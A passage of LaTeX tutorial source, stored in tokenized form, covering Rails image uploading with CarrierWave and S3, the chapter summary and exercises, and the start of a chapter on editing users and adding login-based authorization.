▁If ▁you ' re ▁not ▁using ▁the ▁cloud ▁IDE ▁or ▁an ▁equivalent ▁L in u x ▁system , ▁do ▁a ▁Google ▁search ▁for ▁`` image magic k ▁< your ▁platform > ''.
▁On ▁OS ~ X , ▁\ k ode { brew ▁install ▁image magic k } ▁should ▁work ▁if ▁you ▁have ▁\ href { http :// brew . s h /}{ Home brew } ▁installed .
▁Next , ▁we ▁need ▁to ▁include ▁ CarrierWave ' s ▁\ href { https :// github . com / mini magic k / mini magic k }{ M in i M a g ic k } ▁interface ▁for ▁ Image M a g ic k , ▁together ▁with ▁a ▁ resizing ▁command .
▁For ▁the ▁ resizing ▁command , ▁there ▁are ▁sever al ▁possibilities ▁list ed ▁in ▁the ▁\ href { http :// www . rdoc . info / github / j n ic k la s / carrierwave / CarrierWave / M in i M a g ic k }{ M in i M a g ic k ▁documentation }, ▁but ▁the ▁one ▁we ▁want ▁is ▁\ k ode { re size \_ to \_ limit : ▁[ 4 00 , ▁4 00 ]} , ▁which ▁re size s ▁large ▁images ▁so ▁that ▁they ▁are n ' t ▁any ▁big g er ▁than ▁4 00 p x ▁in ▁either ▁d i me n s ion , ▁while ▁simul t an e ous ly ▁leav ing ▁small er ▁images ▁ al one .
▁( The ▁other ▁main ▁possibilities ▁list ed ▁in ▁the ▁\ href { https :// github . com / carrierwave uploader / carrierwave # using - mini magic k }{ CarrierWave ▁documentation ▁on ▁M in i M a g ic k } ▁\ emph { str et ch } ▁images ▁if ▁they ' re ▁too ▁small , ▁which ▁is n ' t ▁what ▁we ▁want ▁in ▁this ▁case .)
▁With ▁the ▁code ▁as ▁show n ▁in ▁Listing ~\ ref { code : image _ uploader _ resizing }, ▁large ▁images ▁are ▁now ▁re size d ▁nicely ▁( F igure ~\ ref { fig : re size d _ image }).
▁Configur ing ▁the ▁image ▁ uploader ▁for ▁image ▁ resizing .
▁A ▁nicely ▁re size d ▁image .
▁The ▁image ▁ uploader ▁ developed ▁in ▁Section ~\ ref { sec : image _ resizing } ▁is ▁good ▁enough ▁for ▁development , ▁but ▁( as ▁seen ▁in ▁the ▁\ k ode { st or age ▁: file } ▁line ▁in ▁Listing ~\ ref { code : image _ uploader _ resizing }) ▁it ▁uses ▁the ▁local ▁file system ▁for ▁storing ▁the ▁images , ▁which ▁is n ' t ▁a ▁good ▁practice ▁in ▁production
▁A mong ▁other ▁things , ▁file ▁storage ▁on ▁Heroku ▁is ▁temporary , ▁so ▁uploaded ▁images ▁will ▁be ▁deleted ▁every ▁time ▁you ▁deploy .
▁Instead , ▁we ' ll ▁use ▁a ▁cloud ▁storage ▁ service ▁to ▁store ▁images ▁separate ly ▁from ▁our ▁application
▁This ▁is ▁a ▁challenging ▁section ▁and ▁can ▁be ▁skip ped ▁without ▁ lo s s ▁of ▁continu ity .
▁To ▁configure ▁our ▁application ▁to ▁use ▁cloud ▁storage ▁in ▁production , ▁we ' ll ▁use ▁the ▁\ text tt { f o g } ▁gem , ▁as ▁show n ▁in ▁Listing ~\ ref { code : image _ uploader _ production }.
▁Configur ing ▁the ▁image ▁ uploader ▁for ▁production .
▁Listing ~\ ref { code : image _ uploader _ production } ▁uses ▁the ▁\ k ode { production ? }
▁S 3 ▁is ▁a ▁p a id ▁ service , ▁but ▁the ▁storage ▁needed ▁to ▁set ▁up ▁and ▁test ▁the ▁Rails ▁Tutorial ▁sample ▁application ▁co st s ▁less ▁than ▁a ▁c ent ▁per ▁ month .
▁ Sign ▁up ▁for ▁an ▁\ href { http :// a w s . a mazon . com /}{ A mazon ▁Web ▁S er v ic es } ▁account .
▁Create ▁a ▁user ▁via ▁\ href { http :// a w s . a mazon . com / i am /}{ A W S ▁I d ent ity ▁and ▁Access ▁M an age ment ▁( I A M )} ▁and ▁record ▁the ▁access ▁key ▁and ▁secret ▁key .
▁Create ▁an ▁S 3 ▁b uck et ▁( with ▁a ▁name ▁of ▁your ▁choice ) ▁using ▁the ▁\ href { https :// console . a w s . a mazon . com / s 3 }{ A W S ▁Co n so le }, ▁and ▁the n ▁gra n t ▁read ▁and ▁write ▁ permission ▁to ▁the ▁user ▁created ▁in ▁the ▁previous ▁step .
▁On ce ▁you ' ve ▁created ▁and ▁configured ▁your ▁S 3 ▁account , ▁you ▁should ▁create ▁and ▁fill ▁the ▁ CarrierWave ▁configuration ▁file ▁as ▁show n ▁in ▁Listing ~\ ref { code : c ar r i er _ w a ve _ configuration }.
▁Configur ing ▁ CarrierWave ▁to ▁use ▁S 3 .
▁As ▁with ▁production ▁email ▁configuration ▁( Listing ~\ ref { code : s end gr id _ config }), ▁Listing ~\ ref { code : c ar r i er _ w a ve _ configuration } ▁uses ▁Heroku ▁\ k ode { ENV } ▁variables ▁to ▁avoid ▁hard - coding ▁ sensitive ▁information .
▁In ▁Section ~\ ref { sec : email _ in _ production }, ▁these ▁variables ▁were ▁defined ▁automatically ▁via ▁the ▁SendGrid ▁add - on , ▁but ▁in ▁this ▁case ▁we ▁need ▁to ▁define ▁them ▁explicitly , ▁which ▁we ▁can ▁accomplish ▁using ▁\ k ode { heroku ▁config : set } ▁as ▁follows :
▁With ▁the ▁configuration ▁above , ▁we ▁are ▁ready ▁to ▁commit ▁our ▁changes ▁and ▁deploy .
▁I ▁recommend ▁updating ▁your ▁\ k ode { . gitignore } ▁file ▁as ▁show n ▁in ▁Listing ~\ ref { code : gitignore _ upload s } ▁so ▁that ▁the ▁image ▁upload s ▁directory ▁is ▁ignored .
▁ Adding ▁the ▁upload s ▁directory ▁to ▁the ▁\ k ode { . gitignore } ▁file .
▁We ' re ▁now ▁ready ▁to ▁commit ▁the ▁changes ▁on ▁our ▁topic ▁branch ▁and ▁merge ▁back ▁to ▁master :
▁Then ▁we ▁deploy , ▁reset ▁the ▁database , ▁and ▁re seed ▁the ▁sample ▁data :
▁Because ▁Heroku ▁comes ▁with ▁an ▁installation ▁of ▁ Image M a g ic k , ▁the ▁result ▁is ▁successful ▁image ▁ resizing ▁and ▁upload ▁in ▁production , ▁as ▁seen ▁in ▁F igure ~\ ref { fig : image _ upload _ production }.
▁ Image ▁upload ▁in ▁production .
▁With ▁the ▁addition ▁of ▁the ▁Microposts ▁resource , ▁we ▁are ▁ nearly ▁finished ▁with ▁our ▁sample ▁application .
▁All ▁that ▁remain s ▁is ▁to ▁add ▁a ▁so cial ▁layer ▁by ▁let ting ▁users ▁follow ▁each ▁other .
▁We ' ll ▁learn ▁how ▁to ▁model ▁such ▁user ▁relationships , ▁and ▁see ▁the ▁implications ▁for ▁the ▁microposts ▁feed , ▁in ▁Chapter ~\ ref { cha : following _ users }.
▁If ▁you ▁skip ped ▁Section ~\ ref { sec : image _ upload _ in _ production }, ▁be ▁sure ▁to ▁commit ▁and ▁merge ▁your ▁changes :
▁Then ▁deploy ▁to ▁production :
▁It ' s ▁worth ▁noting ▁that ▁this ▁chapter ▁saw ▁the ▁last ▁of ▁the ▁necessary ▁gem ▁installation s .
▁in ▁Listing ~\ ref { code : final _ gemfile }.
▁The ▁final ▁\ k ode { Gemfile } ▁for ▁the ▁sample ▁application .
▁ }< n > %= ▁< < ( chapter s / gemfile s / sample _ app / Gemfile , ▁ lang : ▁ ruby )< n >\ end { code listing }< n >< n >\ subsection { What ▁we ▁ learned ▁in ▁this ▁chapter } ▁% ▁( fold )< n >\ label { sec : user _ microposts _ what _ we _ learned _ in _ this _ chapter }< n >< n >\ begin { item ize }< n >< n >\ item
▁Microposts , ▁like ▁Users , ▁are ▁model ed ▁as ▁a ▁resource ▁back ed ▁by ▁an ▁Active ▁Record ▁model .
▁Rails ▁supports ▁multiple - key ▁indices .
▁We ▁can ▁model ▁a ▁user ▁ having ▁many ▁microposts ▁using ▁the ▁\ k ode { has \_ many } ▁and ▁\ k ode { belongs \_ to } ▁methods ▁in ▁the ▁User ▁and ▁Micropost ▁models , ▁respectively .
▁The ▁\ k ode { has \_ many } / \ k ode { belongs \_ to } ▁combination ▁gives ▁ r is e ▁to ▁methods ▁that ▁work ▁through ▁the ▁association .
▁The ▁code ▁\ k ode { user . microposts . build (...) } ▁returns ▁a ▁new ▁Micropost ▁object ▁automatically ▁ associated ▁with ▁the ▁given ▁user .
▁Rails ▁supports ▁default ▁order ing ▁via ▁\ k ode { default \_ scope }.
▁Scopes ▁take ▁ anonymous ▁functions ▁as ▁arguments .
▁The ▁\ k ode { dependent : ▁: destroy } ▁option ▁cause s ▁objects ▁to ▁be ▁destroyed ▁at ▁the ▁same ▁time ▁as ▁ associated ▁objects .
▁P a g in ation ▁and ▁object ▁count s ▁can ▁both ▁be ▁perform ed ▁through ▁associations , ▁leading ▁to ▁automatically ▁ efficient ▁code .
▁Fix t ure s ▁support ▁the ▁creation ▁of ▁associations .
▁It ▁is ▁possible ▁to ▁pass ▁variables ▁to ▁Rails ▁partials .
▁The ▁\ k ode { where } ▁method ▁can ▁be ▁used ▁to ▁perform ▁Active ▁Record ▁select ion s .
▁We ▁can ▁enforce ▁secure ▁operations ▁by ▁always ▁creating ▁and ▁destroying ▁ dependent ▁objects ▁through ▁their ▁association .
▁We ▁can ▁upload ▁and ▁re size ▁images ▁using ▁ CarrierWave .
▁Re factor ▁the ▁Home ▁page ▁to ▁use ▁separate ▁partials ▁for ▁the ▁two ▁branches ▁of ▁the ▁\ k ode { if } - \ k ode { else } ▁statement .
▁Add ▁tests ▁for ▁the ▁sidebar ▁micropost ▁count ▁( including ▁proper ▁ pluralization ).
▁Listing ~\ ref { code : side bar _ micropost _ count } ▁will ▁help ▁get ▁you ▁started .
▁Follow ing ▁the ▁template ▁in ▁Listing ~\ ref { code : image _ upload _ test }, ▁write ▁a ▁test ▁of ▁the ▁image ▁ uploader ▁in ▁Section ~\ ref { sec : micropost _ images }.
▁To ▁avoid ▁a ▁confusing ▁error , ▁you ▁will ▁also ▁need ▁to ▁configure ▁ CarrierWave ▁to ▁skip ▁image ▁ resizing ▁in ▁tests ▁by ▁creating ▁an ▁initializer ▁file ▁as ▁show n ▁in ▁Listing ~\ ref { code : skip _ re size _ initialize r }.
▁The ▁ additional ▁assertion s ▁in ▁Listing ~\ ref { code : image _ upload _ test } ▁check ▁both ▁for ▁a ▁file ▁upload ▁field ▁on ▁the ▁Home ▁page ▁and ▁for ▁a ▁valid ▁image ▁attribute ▁on ▁the ▁micropost ▁result ing ▁from ▁valid ▁submission .
▁\ emph { Hint } : ▁To ▁check ▁for ▁a ▁valid ▁\ k ode { picture } ▁attribute , ▁use ▁the ▁\ k ode { assigns } ▁method ▁mentioned ▁in ▁Section ~\ ref { sec : activation _ test _ and _ refactoring } ▁to ▁access ▁the ▁micropost ▁in ▁the ▁\ k ode { create } ▁action ▁after ▁valid ▁submission .
▁A ▁template ▁for ▁the ▁sidebar ▁micropost ▁count ▁test .
▁" 0 ▁microposts "
▁A ▁template ▁for ▁testing ▁image ▁upload .
▁An ▁initializer ▁to ▁skip ▁image ▁ resizing ▁in ▁tests .
▁In ▁this ▁chapter , ▁we ▁will ▁complete ▁the ▁REST ▁actions ▁for ▁the ▁Users ▁resource ▁( Table ~\ ref { table : RESTful _ users }) ▁by ▁adding ▁\ k ode { edit }, ▁\ k ode { update }, ▁\ k ode { index }, ▁and ▁\ k ode { destroy } ▁actions .
▁We ' ll ▁start ▁by ▁giv ing ▁users ▁the ▁ability ▁to ▁update ▁their ▁profile s , ▁which ▁will ▁also ▁provide ▁a ▁natural ▁opportunit y ▁to ▁enforce ▁an ▁authorization ▁model ▁( ma de ▁possible ▁by ▁the ▁authentication ▁code ▁in ▁Chapter ~\ ref { cha : log _ in _ log _ out }).
▁Then ▁we ' ll ▁make ▁a ▁list ing ▁of ▁all ▁users ▁( also ▁requiring ▁authentication ), ▁which ▁will ▁motivate ▁the ▁introduction ▁of ▁sample ▁data ▁and ▁pagination .
▁F inally , ▁we ' ll ▁add ▁the ▁ability ▁to ▁destroy ▁users , ▁ w ip ing ▁them ▁clear ▁from ▁the ▁database .
▁S ince ▁we ▁can ' t ▁allow ▁just ▁any ▁user ▁to ▁have ▁such ▁ danger ous ▁power s , ▁we ' ll ▁take ▁care ▁to ▁create ▁a ▁privilege d ▁class ▁of ▁ administrative ▁users ▁authoriz ed ▁to ▁delete ▁other ▁users .
▁< n >< n > ▁\ section { Updating ▁users } ▁% ▁( fold )< n > ▁\ label { sec : updating _ users }< n >< n >
▁The ▁pattern ▁for ▁editing ▁user ▁information ▁close ly ▁parallel s ▁that ▁for ▁creating ▁new ▁users ▁( Chapter ~\ ref { cha : sign _ up }).
▁The ▁big g est ▁difference ▁is ▁that , ▁while ▁any one ▁can ▁sign ▁up , ▁only ▁the ▁current ▁user ▁should ▁be ▁able ▁to ▁update ▁their ▁information .
▁The ▁authentication ▁machinery ▁from ▁Chapter ~\ ref { cha : log _ in _ log _ out } ▁will ▁allow ▁us ▁to ▁use ▁a ▁\ emph { before ▁filter } ▁to ▁ensure ▁that ▁this ▁is ▁the ▁case .
▁To ▁get ▁started , ▁let ' s ▁start ▁work ▁on ▁an ▁\ k ode { updating - users } ▁topic ▁branch :
▁We ▁start ▁with ▁the ▁\ k ode { edit } ▁action , ▁which ▁requires ▁pull ing ▁the ▁relevant ▁user ▁out ▁of ▁the ▁database .
▁Note ▁from ▁Table ~\ ref { table : RESTful _ users } ▁that ▁the ▁proper ▁URL ▁for ▁a ▁user ' s ▁edit ▁page ▁is ▁/ users /1/ edit ▁( as sum ing ▁the ▁user ' s ▁id ▁is ~\ text tt {1} ).
▁Recall ▁that ▁the ▁id ▁of ▁the ▁user ▁is ▁available ▁in ▁the ▁\ k ode { params [: id ]} ▁variable , ▁which ▁means ▁that ▁we ▁can ▁find ▁the ▁user ▁with ▁the ▁code ▁in ▁Listing ~\ ref { code : initial _ edit _ action }.
▁A ▁mockup ▁of ▁the ▁user ▁edit ▁page .
▁The ▁user ▁\ k ode { edit } ▁action .
▁The ▁corresponding ▁user ▁edit ▁view ▁( which ▁you ▁will ▁have ▁to ▁create ▁by ▁hand ) ▁is ▁show n ▁in ▁Listing ~\ ref { code : user _ edit _ view }.
▁Note ▁how ▁close ly ▁this ▁re s em b le s ▁the ▁new ▁user ▁view ▁from ▁Listing ~\ ref { code : signup _ form } ; ▁the ▁large ▁ overlap ▁suggest s ▁factor ing ▁the ▁repeated ▁code ▁into ▁a ▁partial , ▁which ▁is ▁left ▁as ▁an ▁exercise ▁( Section ~\ ref { sec : updating _ deleting _ exercises }).
▁The ▁user ▁edit ▁view .
▁Here ▁we ▁have ▁reuse d ▁the ▁ shared ▁\ k ode { error \_ messages } ▁partial ▁introduce d ▁in ▁Section ~\ ref { sec : signup _ error _ messages }.
▁By ▁the ▁way , ▁the ▁use ▁of ▁\ k ode { target =" \_ blank "} ▁in ▁the ▁Gravatar ▁link ▁is ▁a ▁ n e at ▁trick ▁to ▁get ▁the ▁browser ▁to ▁open ▁the ▁page ▁in ▁a ▁new ▁window ▁or ▁tab , ▁which ▁is ▁convenient ▁behavior ▁when ▁link ing ▁to ▁a ▁third - part y ▁site .
▁With ▁the ▁\ k ode {@ user } ▁instance ▁variable ▁from ▁Listing ~\ ref { code : initial _ edit _ action }, ▁the ▁edit ▁page ▁should ▁render ▁properly , ▁as ▁show n ▁in ▁F igure ~\ ref { fig : edit _ page }.
▁The ▁`` Name '' ▁and ▁`` E mail '' ▁fields ▁in ▁F igure ~\ ref { fig : edit _ page } ▁also ▁shows ▁how ▁Rails ▁automatically ▁pre - fi ll s ▁the ▁Name ▁and ▁Email ▁fields ▁using ▁the ▁attributes ▁of ▁the ▁existing ▁\ k ode {@ user } ▁variable .
▁L oo k ing ▁at ▁the ▁HTML ▁source ▁for ▁F igure ~\ ref { fig : edit _ page }, ▁we ▁see ▁a ▁form ▁tag ▁as ▁expected , ▁as ▁in ▁Listing ~\ ref { code : edit _ form _ html } ▁( s l ight ▁details ▁may ▁differ ).
▁HTML ▁for ▁the ▁edit ▁form ▁defined ▁in ▁Listing ~\ ref { code : user _ edit _ view } ▁and ▁show n ▁in ▁F igure ~\ ref { fig : edit _ page }.
▁Note ▁here ▁the ▁hidden ▁input ▁field
▁S ince ▁web ▁browsers ▁can ' t ▁native ly ▁send ▁\ text tt { PATCH } ▁requests ▁( as ▁required ▁by ▁the ▁REST ▁convention s ▁from ▁Table ~\ ref { table : RESTful _ users }), ▁Rails ▁fake s ▁it ▁with ▁a ▁\ text tt { POST } ▁request ▁and ▁a ▁hidden ▁\ k ode { input } ▁field
▁Do n ' t ▁worry ▁about ▁how ▁this ▁works ; ▁the ▁details ▁are ▁of ▁interest ▁to ▁developers ▁of ▁the ▁Rails ▁framework ▁itself , ▁and ▁by ▁design ▁are ▁not ▁important ▁for ▁Rails ▁application ▁developers .
▁There ' s ▁another ▁subtlety ▁to ▁address ▁here : ▁the ▁code ▁\ k ode { form \_ for (@ user )} ▁in ▁Listing ~\ ref { code : user _ edit _ view } ▁is ▁\ emph { exactly } ▁the ▁same ▁as ▁the ▁code ▁in ▁Listing ~\ ref { code : signup _ form }--- so ▁how ▁does ▁Rails ▁know ▁to ▁use ▁a ▁\ text tt { POST } ▁request ▁for ▁new ▁users ▁and ▁a ▁\ text tt { PATCH } ▁for ▁editing ▁users ?
▁The ▁an s w er ▁is ▁that ▁it ▁is ▁possible ▁to ▁tell ▁whether ▁a ▁user ▁is ▁new ▁or ▁already ▁exists ▁in ▁the ▁database ▁via ▁Active ▁Record ' s ▁\ k ode { new \_ record ?}\ ▁boolean ▁method :
▁When ▁construct ing ▁a ▁form ▁using ▁\ k ode { form \_ for (@ user ) }, ▁Rails ▁uses ▁\ text tt { POST } ▁if ▁\ line break ▁\ k ode {@ user . new \_ record ?}\ ▁is ▁\ k ode { true } ▁and ▁\ text tt { PATCH } ▁if ▁it ▁is ▁\ k ode { false }.
▁As ▁a ▁final ▁ touch , ▁we ' ll ▁fill ▁in ▁the ▁URL ▁of ▁the ▁settings ▁link ▁in ▁the ▁site ▁navigation .
▁This ▁is ▁easy ▁using ▁the ▁named ▁route ▁\ k ode { edit \_ user \_ path } ▁from ▁Table ~\ ref { table : RESTful _ users }, ▁together ▁with ▁the ▁hand y ▁\ k ode { current \_ user } ▁helper ▁method ▁defined ▁in ▁Listing ~\ ref { code : persistent _ current _ user } :
▁The ▁full ▁application ▁code ▁appears ▁in ▁Listing ~\ ref { code : settings _ link }).
▁ Adding ▁a ▁URL ▁to ▁the ▁`` S et ting s '' ▁link ▁in ▁the ▁site ▁layout .
▁In ▁this ▁section ▁we ' ll ▁handle ▁ unsuccessful ▁edit s , ▁following ▁similar ▁idea s ▁to ▁ unsuccessful ▁signup s ▁( Section ~\ ref { sec : unsuccessful _ signup s }).
▁We ▁start ▁by ▁creating ▁an ▁\ k ode { update } ▁action , ▁which ▁uses ▁\ k ode { update \_ attributes } ▁( Section ~\ ref { sec : updating _ user _ objects }) ▁to ▁update ▁the ▁user ▁base d ▁on ▁the ▁submitted ▁\ k ode { params } ▁hash , ▁as ▁show n ▁in ▁Listing ~\ ref { code : user _ update _ action _ unsuccessful }.
▁With ▁invalid ▁information , ▁the ▁update ▁attempt ▁returns ▁\ k ode { false }, ▁so ▁the ▁\ k ode { else } ▁branch ▁render s ▁the ▁edit ▁page .
▁We ' ve ▁seen ▁this ▁pattern ▁before ; ▁the ▁structure ▁close ly ▁parallel s ▁the ▁first ▁version ▁of ▁the ▁\ k ode { create } ▁action ▁( Listing ~\ ref { code : first _ create _ action }).
▁The ▁initial ▁user ▁\ k ode { update } ▁action .
▁# ▁H and le ▁a ▁successful ▁update .
▁Note ▁the ▁use ▁of ▁\ k ode { user \_ params } ▁in ▁the ▁call ▁to ▁\ k ode { update \_ attributes }, ▁which ▁uses ▁ strong ▁parameters ▁to ▁prevent ▁ mass ▁assignment ▁ vulnerabilit y ▁( as ▁describe d ▁in ▁Section ~\ ref { sec : strong _ parameters }).
▁Because ▁of ▁the ▁existing ▁User ▁model ▁validations ▁and ▁the ▁error - messages ▁partial ▁in ▁Listing ~\ ref { code : user _ edit _ view }, ▁submission ▁of ▁invalid ▁information ▁results ▁in ▁helpful ▁error ▁messages ▁( F igure ~\ ref { fig : b ug g y _ edit _ with _ invalid _ information }).
▁ Error ▁message ▁from ▁ submitting ▁the ▁update ▁form .
▁We ▁left ▁Section ~\ ref { sec : unsuccessful _ edit s } ▁with ▁a ▁working ▁edit ▁form .
▁Ou r ▁first ▁step ▁is ▁to ▁generate ▁an ▁integration ▁test ▁as ▁usual :
▁Then ▁we ' ll ▁write ▁a ▁simple ▁test ▁of ▁an ▁ unsuccessful ▁edit , ▁as ▁show n ▁in ▁Listing ~\ ref { code : unsuccessful _ edit _ test }.
▁The ▁test ▁in ▁Listing ~\ ref { code : unsuccessful _ edit _ test } ▁check s ▁for ▁the ▁correct ▁behavior ▁by ▁verify ing ▁that ▁the ▁edit ▁template ▁is ▁rendered ▁after ▁getting ▁the ▁edit ▁page ▁and ▁re - render ed ▁upon ▁submission ▁of ▁invalid ▁information .
▁Note ▁the ▁use ▁of ▁the ▁\ k ode { patch } ▁method ▁to ▁issue ▁a ▁\ text tt { PATCH } ▁request , ▁which ▁follows ▁the ▁same ▁pattern ▁as ▁\ k ode { get }, ▁\ k ode { post }, ▁and ▁\ k ode { delete }.
▁A ▁test ▁for ▁an ▁ unsuccessful ▁edit .
▁Now ▁it ' s ▁time ▁to ▁get ▁the ▁edit ▁form ▁to ▁work .
▁ Edit ing ▁the ▁profile ▁images ▁is ▁already ▁functional ▁since ▁we ' ve ▁out source d ▁image ▁upload ▁to ▁the ▁Gravatar ▁website ; ▁we ▁can ▁edit ▁Gravatar s ▁by ▁click ing ▁on ▁the ▁`` change '' ▁link ▁from ▁F igure ~\ ref { fig : edit _ page }, ▁as ▁show n ▁in ▁F igure ~\ ref { fig : gravatar _ c r o p p er }.
▁Let ' s ▁get ▁the ▁rest ▁of ▁the ▁user ▁edit ▁functionality ▁working ▁as ▁well .
▁The ▁\ href { http :// gravatar . com /}{ Gravatar } ▁image - c r o p p ing ▁interface , ▁with ▁a ▁ picture ▁of ▁\ href { http :// www . michael hartl . com /}{ some ▁ dude }.
▁As ▁you ▁get ▁more ▁com for table ▁with ▁testing , ▁you ▁m ight ▁find ▁that ▁it ' s ▁useful ▁to ▁write ▁integration ▁tests ▁before ▁writing ▁the ▁application ▁code ▁instead ▁of ▁after .
▁In ▁this ▁context , ▁such ▁tests ▁are ▁some times ▁known ▁as ▁\ emph { acceptance ▁tests }, ▁since ▁they ▁determine ▁when ▁a ▁particular ▁feature ▁should ▁be ▁accepted ▁as ▁complete .
▁To ▁see ▁how ▁this ▁works , ▁we ' ll ▁complete ▁the ▁user ▁edit ▁feature ▁using ▁test - driven ▁development .
▁We ' ll ▁test ▁for ▁the ▁correct ▁behavior ▁of ▁updating ▁users ▁by ▁writing ▁a ▁test ▁similar ▁to ▁the ▁one ▁show n ▁in ▁Listing ~\ ref { code : unsuccessful _ edit _ test }, ▁only ▁this ▁time ▁we ' ll ▁submit ▁valid ▁information .
▁Then ▁we ' ll ▁check ▁for ▁a ▁non empty ▁flash ▁message ▁and ▁a ▁successful ▁redirect ▁to ▁the ▁profile ▁page , ▁while ▁also ▁verify ing ▁that ▁the ▁user ' s ▁information ▁correctly ▁changed ▁in ▁the ▁database .
▁The ▁result ▁appears ▁in ▁Listing ~\ ref { code : successful _ edit _ test }
▁Note ▁that ▁the ▁password ▁and ▁confirmation ▁in ▁Listing ~\ ref { code : successful _ edit _ test } ▁are ▁blank , ▁which ▁is ▁convenient ▁for ▁users ▁who ▁don ' t ▁want ▁to ▁update ▁their ▁passwords ▁every ▁time ▁they ▁update ▁their ▁names ▁or ▁email ▁addresses .
▁Note ▁also ▁the ▁use ▁of ▁\ k ode {@ user . reload } ▁( first ▁seen ▁in ▁Section ~\ ref { sec : updating _ user _ objects }) ▁to ▁reload ▁the ▁user ' s ▁values ▁from ▁the ▁database ▁and ▁confirm ▁that ▁they ▁were ▁successfully ▁updated .
▁( This ▁is ▁the ▁kind ▁of ▁detail ▁you ▁could ▁easily ▁ forget ▁initially , ▁which ▁is ▁why ▁ acceptance ▁testing ▁( and ▁ TDD ▁generally ) ▁require ▁a ▁certain ▁level ▁of ▁experience ▁to ▁be ▁effective .)
▁A ▁test ▁of ▁a ▁successful ▁edit .
▁The ▁\ k ode { update } ▁action ▁needed ▁to ▁get ▁the ▁tests ▁in ▁Listing ~\ ref { code : successful _ edit _ test } ▁to ▁pass ▁is ▁similar ▁to ▁the ▁final ▁form ▁of ▁the ▁\ k ode { create } ▁action ▁( Listing ~\ ref { code : login _ upon _ signup }), ▁as ▁seen ▁in ▁Listing ~\ ref { code : user _ update _ action }.
▁The ▁user ▁\ k ode { update } ▁action .
▁in ▁Listing ~\ ref { code : successful _ edit _ test }.
▁To ▁get ▁the ▁tests ▁to ▁\ passing , ▁we ▁need ▁to ▁make ▁an ▁exception ▁to ▁the ▁password ▁validation ▁if ▁the ▁password ▁is ▁empty .
▁We ▁can ▁do ▁this ▁by ▁passing ▁the ▁\ k ode { allow \_ nil : ▁true } ▁option ▁to ▁\ k ode { validates }, ▁as ▁seen ▁in ▁Listing ~\ ref { code : allow _ blank _ password }.
▁A l low ing ▁empty ▁passwords ▁on ▁update .
▁With ▁the ▁code ▁in ▁this ▁section , ▁the ▁user ▁edit ▁page ▁should ▁be ▁working ▁( F igure ~\ ref { fig : edit _ form _ working }), ▁as ▁you ▁can ▁double - check ▁by ▁re - running ▁the ▁test ▁suite , ▁which ▁should ▁now ▁be ▁\ passing :
▁The ▁result ▁of ▁a ▁successful ▁edit .
▁In ▁the ▁context ▁of ▁web ▁applications , ▁\ emph { authentication } ▁allows ▁us ▁to ▁identify ▁users ▁of ▁our ▁site , ▁and ▁\ emph { authorization } ▁let s ▁us ▁control ▁what ▁they ▁can ▁do .
▁One ▁nice ▁effect ▁of ▁build ing ▁the ▁authentication ▁machinery ▁in ▁Chapter ~\ ref { cha : log _ in _ log _ out } ▁is ▁that ▁we ▁are ▁now ▁in ▁a ▁position ▁to ▁implement ▁authorization ▁as ▁well .
▁A lthough ▁the ▁edit ▁and ▁update ▁actions ▁from ▁Section ~\ ref { sec : updating _ users } ▁are ▁functional ly ▁complete , ▁they ▁ s u ff er ▁from ▁a ▁ r id ic ul ous ▁security ▁f la w : ▁they ▁allow ▁any one ▁( even ▁non - logged - in ▁users ) ▁to ▁access ▁either ▁action , ▁and ▁any ▁logged - in ▁user ▁can ▁update ▁the ▁information ▁for ▁any ▁other ▁user .
▁In ▁this ▁section , ▁we ' ll ▁implement ▁a ▁security ▁model ▁that ▁requires ▁users ▁to ▁be ▁logged ▁in ▁and ▁prevent s ▁them ▁from ▁updating ▁any ▁information ▁other ▁than ▁their ▁own .
▁In ▁Section ~\ ref { sec : requiring _ logged _ in _ users }, ▁we ' ll ▁handle ▁the ▁case ▁of < n > n on - logged - in ▁users ▁who ▁try ▁to ▁access ▁a ▁ protected ▁page ▁to ▁which ▁they ▁m ight ▁normally ▁have ▁access .
▁Because ▁this ▁could ▁easily ▁happen ▁in ▁the ▁normal ▁course ▁of ▁using ▁the ▁application , ▁such ▁users ▁will ▁be ▁forward ed ▁to ▁the ▁login ▁page ▁with ▁a ▁helpful ▁message , ▁as ▁mock ed ▁up ▁in ▁F igure ~\ ref { fig : login _ page _ protected _ mockup }.
▁On ▁the ▁other ▁hand , ▁users ▁who ▁try ▁to ▁access ▁a ▁page ▁for ▁which ▁they ▁would ▁ never ▁be ▁authoriz ed ▁( such ▁as ▁a ▁logged - in ▁user ▁try ing ▁to ▁access ▁a ▁different ▁user ' s ▁edit ▁page ) ▁will ▁be ▁redirect ed ▁to ▁the ▁root ▁URL ▁( Section ~\ ref { sec : requiring _ the _ right _ user }).
▁< n >< n >\ begin { figure }< n >\ begin { center }< n >\ image box { images / figures / login _ page _ protected _ mockup . png }< n >\ end { center }< n >\ caption { A ▁mockup ▁of ▁the ▁result ▁of ▁visit ing ▁a ▁ protected ▁page \ label { fig : login _ page _ protected _ mockup } }< n >\ end { figure }< n >< n > ▁\ subsection { Requir ing ▁logged - in ▁users } ▁% ▁( fold )< n > ▁\ label { sec : requiring _ logged _ in _ users }< n >< n >
▁To ▁implement ▁the ▁forwarding ▁behavior ▁show n ▁in ▁F igure ~\ ref { fig : login _ page _ protected _ mockup }, ▁we ' ll ▁use ▁a ▁\ emph { before ▁filter } ▁in ▁the ▁Users ▁controller .
▁Before ▁filter s ▁use ▁the ▁\ k ode { before \_ action } ▁command ▁to ▁arrange ▁for ▁a ▁particular ▁method ▁to ▁be ▁called ▁before ▁the ▁given ▁actions
▁To ▁require ▁users ▁to ▁be ▁logged ▁in , ▁we ▁define ▁a ▁\ k ode { logged \_ in \_ user } ▁method ▁and ▁invoke ▁it ▁using ▁\ k ode { before \_ action ▁: logged \_ in \_ user }, ▁as ▁show n ▁in ▁Listing ~\ ref { code : authorize _ before _ filter }.
▁ Adding ▁a ▁\ k ode { logged \_ in \_ user } ▁before ▁filter .
▁By ▁default , ▁before ▁filter s ▁apply ▁to ▁\ emph { ever y } ▁action ▁in ▁a ▁controller , ▁so ▁here ▁we ▁restrict ▁the ▁filter ▁to ▁act ▁only ▁on ▁the ▁\ k ode { : edit } ▁and ▁\ k ode { : update } ▁actions ▁by ▁passing ▁the ▁appropriate ▁\ k ode { : only } ▁options ▁hash .
▁We ▁can ▁see ▁the ▁result ▁of ▁the ▁before ▁filter ▁in ▁Listing ~\ ref { code : authorize _ before _ filter } ▁by ▁logging ▁out ▁and ▁attempt ing ▁to ▁access ▁the ▁user ▁edit ▁page ▁\ href { http :// localhost :3000/ users /1/ edit }{/ users /1/ edit }, ▁as ▁seen ▁in ▁F igure ~\ ref { fig : protected _ log _ in }.
